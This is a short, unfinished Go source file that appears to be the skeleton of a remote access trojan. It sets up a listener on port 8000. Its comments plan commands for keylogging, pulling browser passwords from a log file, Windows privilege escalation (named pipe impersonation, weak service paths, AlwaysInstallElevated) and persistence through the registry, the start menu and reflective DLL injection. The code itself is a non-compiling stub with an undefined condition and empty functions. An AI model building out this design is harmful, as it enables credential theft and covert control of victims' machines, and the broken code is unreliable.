package main

import (
  "fmt"
)


func main(){
  p := 8000
  listen(p)
}


func listen(p int){
/*
 - listen for incoming connections
 - when connection recieved, spawn interactive (ghetto) shell
*/
  for {
        // do something
    if !condition {      // the condition stops matching
          shell()
          break        // break out of the loop
    }
  }
}

func shell(){
/*
CMDs:

 --> help
  - display help menu
 
 --> keys
  - get key input from client and print to screen
  
 --> brp
  - get browser passes from generated log file and print to screen
  
 --> privesc
  - escalate privilages (define methods 1,2,3,4) (just ask, name pipe impersonation, weak service paths, always install elevated)
  
 --> persis
  - setup persistence (defing methods 1,2,3) (start menu, registry, reflective dll injection into an existing program)
  
  
*/
}
